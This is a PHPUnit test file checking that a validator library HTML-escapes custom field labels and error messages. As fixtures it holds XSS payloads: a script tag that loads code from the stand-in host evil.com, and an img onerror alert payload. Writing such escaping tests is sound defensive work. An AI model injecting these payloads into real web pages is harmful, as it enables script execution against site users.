<?php

namespace Tests\Unit\Validators;

use PHPUnit\Framework\TestCase;

class CustomFieldValidationSecurityTest extends TestCase
{
    #[\PHPUnit\Framework\Attributes\Test]
    public function it_escapes_custom_field_labels_in_validation_errors(): void
    {
        $CI = & get_instance();
        $CI->load->library('Validator');

        $errors = [
            [
                'label' => '<script src=//evil.com/x.js></script>',
                'error' => 'invalid input',
                'error_msg' => 'must be a valid date'
            ]
        ];

        $result = $CI->validator->create_error_text($errors);

        // Should NOT contain unescaped script tag
        $this->assertStringNotContainsString('<script', $result);
        // Should contain escaped version
        $this->assertStringContainsString('&lt;script', $result);
    }

    #[\PHPUnit\Framework\Attributes\Test]
    public function it_escapes_error_messages_in_validation_errors(): void
    {
        $CI = & get_instance();
        $CI->load->library('Validator');

        $errors = [
            [
                'label' => 'Custom Field',
                'error' => 'invalid input',
                'error_msg' => '<img src=x onerror=alert(1)>'
            ]
        ];

        $result = $CI->validator->create_error_text($errors);

        $this->assertStringNotContainsString('<img src=', $result);
        $this->assertStringContainsString('&lt;img', $result);
    }
}
